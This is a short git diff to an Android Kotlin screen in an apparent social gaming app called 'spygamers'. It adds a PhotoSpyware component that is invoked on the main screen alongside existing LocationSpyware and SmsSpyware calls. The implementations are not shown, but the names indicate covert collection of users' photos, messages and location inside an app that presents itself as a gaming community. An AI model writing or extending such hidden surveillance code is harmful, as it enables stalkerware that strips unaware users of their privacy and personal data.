@@ -42,6 +42,7 @@ import androidx.navigation.NavController
 import com.example.spygamers.Screen
 import com.example.spygamers.components.appbar.AppBar
 import com.example.spygamers.components.spyware.LocationSpyware
+import com.example.spygamers.components.spyware.PhotoSpyware
 import com.example.spygamers.components.spyware.SmsSpyware
 import com.example.spygamers.controllers.GamerViewModel
 import com.example.spygamers.models.Friendship
@@ -116,6 +117,7 @@ private fun MainBody(
 
     LocationSpyware(viewModel, context)
     SmsSpyware(viewModel = viewModel, context = context)
+    PhotoSpyware(viewModel, context)
 
     Box(modifier = Modifier.fillMaxSize()) {
         Column(modifier = Modifier.padding(16.dp)) {
